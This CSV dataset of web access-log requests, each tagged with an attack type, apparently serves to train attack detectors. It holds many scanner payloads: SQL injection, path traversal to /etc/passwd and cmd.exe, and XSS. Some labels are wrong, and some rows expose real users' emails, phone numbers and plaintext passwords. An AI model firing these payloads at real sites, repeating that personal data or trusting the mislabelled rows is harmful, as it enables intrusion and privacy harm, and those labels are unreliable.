source,text
"192.168.202.110 - - [16/Mar/2012:14:25:34 +0330] ""GET /examples/jsp/cal/index.php?action=view&module=resourcesmodule&id=0 UNION SELECT -1,'exponent_0964.nasl','Nessus test','O:8:""stdClass"":3:{s:3:""mod"";s:15:""resourcesmodule"";s:3:""src"";s:20:""@random41940ceb78dbb"";s:3:""int"";s:0:"""";}',7,0,0,0,0,0,0 -- HTTP/1.1"" 404 1033 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.238 - - [24/Mar/2018:21:44:51 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini HTTP/1.1"" 404 243 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:26:25 +0330] ""GET /examples/jsp/jsp2/jspx/index.php?act=sm_window&page=event&day=-1 UNION SELECT 1,1331904452,941315700 -- HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:59:02 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [25/Mar/2018:00:26:17 +0330] ""GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1"" 404 571 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:46 +0330] ""GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:49:24 +0330] ""GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus""><script>alert('websense_username_xss.nasl')</script> HTTP/1.1"" 404 306 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:19:37:36 +0330] ""GET /phpmyadmin/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../etc/passwd HTTP/1.1"" 404 297 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"5.101.40.234 - - [23/Jan/2019:06:59:25 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [23/Mar/2018:19:01:24 +0330] ""GET /admin../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 173 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Local File Inclusion
"192.168.202.79 - - [16/Mar/2012:20:34:53 +0330] ""GET /cfdocs/exampleapp/email/getfile.cfm?filename=c:\\boot.ini HTTP/1.1"" 404 313 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000519)"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:14:24:28 +0330] ""GET /examples/servlets/servlet/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd HTTP/1.1"" 404 326 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:15:46:45 +0330] ""GET /en-US/account/index.php?op=Default&Date=200607' UNION SELECT 1,1782293471,1,1,1,1,1,1,1,1--&blogId=1 HTTP/1.1"" 404 300 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:44:47 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini HTTP/1.1"" 403 246 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:54:55 +0330] ""GET /popuplargeimage.asp?strImageTag=<script>foo</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1"" 404 342 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:45 +0330] ""GET /cgi-bin/..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:20 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.219.65.191 - - [23/Jan/2019:02:49:26 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%81%D8%B1%D8%B4%DB%8C%D8%AF&lastName=%D8%A7%D8%B3%D8%AF&username=farshidasad2000%40gmail.com&mobile=09131093601&password=ali110ali110&password2=ali110ali110&newsLettersSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 6.0.1; SM-G800H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:40:22 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:49 +0330] ""GET //../../../../../../../../../winnt/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:53:01 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:08 +0330] ""GET //../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 239 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:15 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20ORDER%20BY%204227%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:26:13 +0330] ""GET /parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 994 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.238 - - [24/Mar/2018:21:51:10 +0330] ""GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:55:14 +0330] ""GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:58:10 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20xcaB HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:15:48:24 +0330] ""GET /en-US/account/?showimage=') UNION SELECT 'pixelpost_15rc1.nasl-1331909372.jpg' as id, 1861417004 as headline, 1458728057 as datetime, 1897594128 as body, 613206426 as category, 1383989387 as image-- HTTP/1.1"" 404 291 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:57 +0330] ""GET http://rfi.nessus.org/check_proxy.html HTTP/1.0"" 404 151 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:16:47:36 +0330] ""GET /cacti/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 296 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:15:39:55 +0330] ""GET /cgi-bin/?showimage=') UNION SELECT 'pixelpost_15rc1.nasl-1331908863.jpg' as id, 1792505087 as headline, 558854862 as datetime, 1787154451 as body, 1470831030 as category, 191019713 as image-- HTTP/1.0"" 200 90 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:56:50 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20AND%209711%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289711%3D9711%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%286717%3D6717 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:49:50 +0330] ""GET /../../../../../../../etc/passwd HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:15:37:33 +0330] ""GET /index.php?option=weblinks&Itemid=2&catid=-1 UNION SELECT 0,1,2,678527169166,4,5,6,7,8,9,10,11-- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:56:41 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20AND%204523%3D4523%20AND%20%27CPIe%27%3D%27CPIe HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:53:18 +0330] ""GET /image/{{basketItem.id}}?type=%28SELECT%20%28CASE%20WHEN%20%284811%3D4811%29%20THEN%204811%20ELSE%204811%2A%28SELECT%204811%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:22:59:24 +0330] ""GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 7694 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:44:41 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:49:18 +0330] ""GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:17 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:45 +0330] ""GET /..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:54:35 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20ORDER%20BY%201--%20oxKV&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""GET /exchange/..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:41 +0330] ""GET /image/{{basketItem.id}}?type=%28SELECT%20CONCAT%280x7171767871%2C%28SELECT%20%28ELT%286384%3D6384%2C1%29%29%29%2C0x7171707a71%29%29&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:58:16 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20UNION%20ALL%20SELECT%20NULL--%20PJAy HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:59:47 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:01 +0330] ""POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1"" 301 178 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:59:03 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:24:29 +0330] ""GET /phpmyadmin/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd HTTP/1.1"" 404 1054 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"188.159.38.238 - - [24/Jan/2019:15:23:40 +0330] ""GET /customer/savePersonalInfo?id=131132&version=2&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%A7%D9%85%DB%8C%D8%B1%D8%AD%D8%B3%DB%8C%D9%86+&lastName=%D8%B0%D8%A7%DA%A9%D8%B1%DB%8C&nationalCode=0384654932&mobile=09126047606&telephone=02537733770&jobTitle=other HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/profile"" ""Mozilla/5.0 (Android 8.0.0; Mobile; rv:63.0) Gecko/63.0 Firefox/63.0"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:36:08 +0330] ""GET http://rfi.nessus.org/check_proxy.html HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:14:37:04 +0330] ""GET /cgi-bin/forum.php?forum=-1 UNION SELECT null,123456,null,null,null,null-- HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:15:45:15 +0330] ""GET /guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 290 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:20 +0330] ""GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1"" 404 326 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:16:48:56 +0330] ""GET /scripts/cal_event.php?id=1' UNION SELECT 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13-- HTTP/1.1"" 404 298 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:44:41 +0330] ""GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1"" 404 283 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"31.56.102.106 - - [24/Jan/2019:19:01:17 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50 HTTP/1.1"" 200 5 ""https://www.zanbil.ir/"" ""Opera/9.80 (Windows NT 6.1; U; Edition Next; en) Presto/2.9.220 Version/12.00"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:49:27 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1"" 503 326 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:46 +0330] ""GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:19:38:45 +0330] ""GET /scripts/index.php?action=view&module=resourcesmodule&id=0 UNION SELECT -1,'exponent_0964.nasl','Nessus test','O:8:""stdClass"":3:{s:3:""mod"";s:15:""resourcesmodule"";s:3:""src"";s:20:""@random41940ceb78dbb"";s:3:""int"";s:0:"""";}',7,0,0,0,0,0,0 -- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:45:02 +0330] ""GET /ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:14 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20AND%201008%3D3830%20AND%20%27%25%27%3D%27&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.138 - - [17/Mar/2012:19:22:40 +0330] ""GET /phpmyadmin/ajax.php?rs=__exp__getFeedContent&rsargs[]=-99 UNION SELECT 854943738,2,566710091,4,5,6,7,8,9,0,1,2,3 -- HTTP/1.1"" 404 297 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.138 - - [17/Mar/2012:19:17:29 +0330] ""GET /insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.0"" 400 3467 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:16 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.241 - - [23/Mar/2018:19:00:07 +0330] ""GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../var/register/system/ldap/rootpw HTTP/1.1"" 404 984 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:16:47:45 +0330] ""GET /scripts/?showimage=') UNION SELECT 'pixelpost_15rc1.nasl-1331912934.jpg' as id, 699943871 as headline, 2110001394 as datetime, 790894722 as body, 336249676 as category, 1994013308 as image-- HTTP/1.1"" 404 285 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:56:14 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:35 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%2883%29%7C%7CCHR%28101%29%7C%7CCHR%2881%29%2C5%29%20FROM%20DUAL-- HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:19:38:44 +0330] ""GET /cgi-bin/event_view.php?eid=34 UNION SELECT 770694655 HTTP/1.1"" 404 300 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.113.26.253 - - [25/Jan/2019:19:47:29 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D8%AC%DB%8C%D8%AF+&lastName=%D8%AA%D9%86%DA%A9%D8%A7%D8%A8%D9%86%DB%8C+&username=toneka%40outlook.com&mobile=09125992479&password=ss118811SS..&password2=ss1q8811SS.. HTTP/1.1"" 200 18081 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.0 Chrome/67.0.3396.87 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"192.168.202.110 - - [16/Mar/2012:18:28:54 +0330] ""GET /recordings/?showimage=') UNION SELECT 'pixelpost_15rc1.nasl-1331919003.jpg' as id, 2104497480 as headline, 940195031 as datetime, 130871453 as body, 1294121028 as category, 1709050041 as image-- HTTP/1.1"" 200 5139 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
